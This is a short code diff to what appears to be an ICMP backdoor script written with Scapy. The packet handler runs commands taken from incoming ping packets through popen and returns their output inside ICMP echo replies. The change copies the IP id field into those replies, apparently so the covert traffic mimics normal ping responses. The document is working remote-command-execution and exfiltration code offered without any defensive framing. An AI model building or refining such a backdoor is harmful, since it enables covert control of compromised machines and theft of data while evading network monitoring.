@@ -28,12 +28,12 @@ def process_packet(packet):
             print(f"Command: \"{command}\"")
             output = popen(command).read()
             print(f"Output: \"{output}\"")
-            reply = IP(src=pkt[IP].dst, dst=pkt[IP].src) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / output
+            reply = IP(src=pkt[IP].dst, dst=pkt[IP].src, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq) / output
             if SEND_REPLY:
                 send(reply)
         else:
             if SEND_REPLY:
-                reply = IP(src=pkt[IP].dst, dst=pkt[IP].src) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
+                reply = IP(src=pkt[IP].dst, dst=pkt[IP].src, id=pkt[IP].id) / ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
                 if payload: 
                     reply = reply / payload
                 send(reply)
